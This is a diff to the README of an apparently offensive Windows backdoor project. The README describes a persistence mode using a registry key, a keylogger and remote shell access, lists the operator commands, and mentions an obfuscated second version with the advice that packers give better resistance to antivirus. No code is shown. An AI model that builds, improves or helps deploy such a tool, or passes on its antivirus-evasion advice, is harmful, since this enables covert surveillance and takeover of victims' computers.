@@ -12,9 +12,13 @@ Replace test.exe by the name you want to call your executable file and it's done
 
 # The project :
 
-The backdoor is functional under Windows and includes a persistent mode, a keylogger and a powershell access.
+The backdoor is functional under Windows and includes a persistent mode, a keylogger and a shell access.
+
+I also put a 2nd version who is the same backdoor but i obfuscate him.
+if you using packer you may have a better resistance to A.V !
 
 ## Command to use it 
 
+- cd : to move another directory when you gain access to your shell
 - persist : to use the persist mode and create an HKEY_CURRENT_KEY
-- keylog_on : ton activate the keylogger
+- keylog : ton activate the keylogger
